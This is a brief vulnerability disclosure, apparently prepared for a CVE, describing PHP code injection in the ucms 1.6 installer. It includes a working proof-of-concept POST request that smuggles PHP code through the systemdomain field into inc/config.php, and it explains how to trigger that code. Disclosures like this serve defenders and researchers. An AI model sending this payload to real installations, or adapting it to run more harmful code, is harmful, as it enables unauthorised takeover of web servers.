# ucms 1.6 PHP Code injection 
ucms 1.6 is vulnerable to Code Injection via /intsall/index.php

# Vulnerability Type :
PHP Code injection 

# Vulnerability Version :
1.6.0


# Vulnerability Description:

line 183 in install/index.php

![](https://github.com/imkitsch/CVE/blob/main/ucms/20211127171241.png)

and write to inc/config.php

![](https://github.com/imkitsch/CVE/blob/main/ucms/20211127171827.png)

poc:

POST /install/index.php?step=2

database=mysqlpdo&mysql_host=127.0.0.1&mysql_dbname=ucms&mysql_user=root&mysql_password=root&sqlite_dbfile=c66a432720a73177.db&tableex=ucms_&systemdomain=1');phpinfo();//&urlrewrite=0&uuuadminname=admin&uuuadminpassword=admin&uuuadminpassword2=admin

![](https://github.com/imkitsch/CVE/blob/main/ucms/20211127172003.png)

Injection php code to inc/config.php

![](https://github.com/imkitsch/CVE/blob/main/ucms/20211127172132.png)

access index.php to get the phpinfo page

